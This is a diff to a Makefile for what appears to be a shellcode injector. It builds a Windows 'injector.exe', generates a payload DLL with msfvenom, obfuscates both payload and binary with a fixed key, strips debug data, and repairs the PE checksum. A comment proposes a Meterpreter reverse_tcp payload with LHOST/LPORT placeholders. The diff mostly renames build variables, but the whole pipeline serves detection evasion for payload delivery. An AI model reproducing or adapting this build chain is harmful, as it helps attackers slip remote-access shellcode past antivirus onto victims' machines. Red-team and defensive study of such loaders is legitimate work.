@@ -9,7 +9,8 @@ STRIP = x86_64-w64-mingw32-strip
 TARGET_EXE = injector.exe
 TARGET_OBFS_EXE = obfsinjector.exe
 OBFS_KEY = 144
-OBFUSCATOR = obfs_src/obfuscator obfs_src/obfuscator.o obfs_src/binary_obfuscator.o obfs_src/payloadObfuscator obfs_src/payloadObfuscator.o
+PAYLOAD_OBFUSCATOR = obfs_src/payloadObfuscator
+BINARY_OBFUSCATOR = obfs_src/obfuscator
 
 # Payload definition
 PAYLOAD_CONFIG= windows/x64/messagebox # use whatever msfvenom payload/config you want. For example: windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT>
@@ -47,28 +48,28 @@ $(ASM_OBJ): $(ASM_SRC)
 obfs_src/%.o: obfs_src/%.c $(C_OBFS_HDRS)
 	$(CC_NATIVE) $(CFLAGS_NATIVE) -c $< -o $@
 
-obfs_src/obfuscator: obfs_src/obfuscator.o obfs_src/binary_obfuscator.o
-	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/obfuscator.o obfs_src/binary_obfuscator.o -o obfs_src/obfuscator
+$(BINARY_OBFUSCATOR): obfs_src/obfuscator.o obfs_src/binary_obfuscator.o
+	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/obfuscator.o obfs_src/binary_obfuscator.o -o $(BINARY_OBFUSCATOR)
 
-obfs_src/payloadObfuscator: obfs_src/payloadObfuscator.o
-	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/payloadObfuscator.o -o obfs_src/payloadObfuscator
+$(PAYLOAD_OBFUSCATOR): obfs_src/payloadObfuscator.o
+	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/payloadObfuscator.o -o $(PAYLOAD_OBFUSCATOR)
 
 # Link the injector executable
-$(TARGET_EXE): $(PAYLOAD_HEADER) $(C_OBJS) $(ASM_OBJ) obfs_src/obfuscator
+$(TARGET_EXE): $(PAYLOAD_HEADER) $(C_OBJS) $(ASM_OBJ) $(BINARY_OBFUSCATOR)
 	$(CC) -o $(TARGET_EXE) $(C_OBJS) $(ASM_OBJ) $(PAYLOAD_HEADER) $(LDFLAGS)
 	$(OBJCOPY) --rename-section .CRT=.data $(TARGET_EXE)
 	$(STRIP) --strip-debug --strip-unneeded $(TARGET_EXE)
-	./obfs_src/obfuscator $(TARGET_EXE) $(TARGET_OBFS_EXE) $(OBFS_KEY)
+	./$(BINARY_OBFUSCATOR) $(TARGET_EXE) $(TARGET_OBFS_EXE) $(OBFS_KEY)
 	python3 fix_checksum.py $(TARGET_OBFS_EXE)
 # cleaning intermediary files
-	rm -f $(ASM_OBJ) $(C_OBJS) $(OBFUSCATOR) $(TARGET_EXE) $(PAYLOAD_DLL)
+	rm -f $(ASM_OBJ) $(C_OBJS) $(PAYLOAD_OBFUSCATOR) $(TARGET_EXE) $(PAYLOAD_DLL) $(BINARY_OBFUSCATOR) $(C_OBFS_OBJS)
 	
-$(PAYLOAD_HEADER): $(PAYLOAD_DLL) obfs_src/payloadObfuscator
-	./obfs_src/payloadObfuscator $(PAYLOAD_DLL) $(OBFS_KEY)
+$(PAYLOAD_HEADER): $(PAYLOAD_DLL) $(PAYLOAD_OBFUSCATOR)
+	./$(PAYLOAD_OBFUSCATOR) $(PAYLOAD_DLL) $(OBFS_KEY)
 
 $(PAYLOAD_DLL):
 	msfvenom -p $(PAYLOAD_CONFIG)-o $(PAYLOAD_DLL)
 
 # Clean up generated files
 clean:
-	rm -f $(ASM_OBJ) $(C_OBJS) $(TARGET_EXE) $(PAYLOAD_DLL) $(OBFUSCATOR) $(TARGET_OBFS_EXE) $(PAYLOAD_HEADER)
+	rm -f $(ASM_OBJ) $(C_OBJS) $(TARGET_EXE) $(PAYLOAD_DLL) $(BINARY_OBFUSCATOR) $(TARGET_OBFS_EXE) $(PAYLOAD_HEADER) $(PAYLOAD_OBFUSCATOR) $(C_OBFS_OBJS)
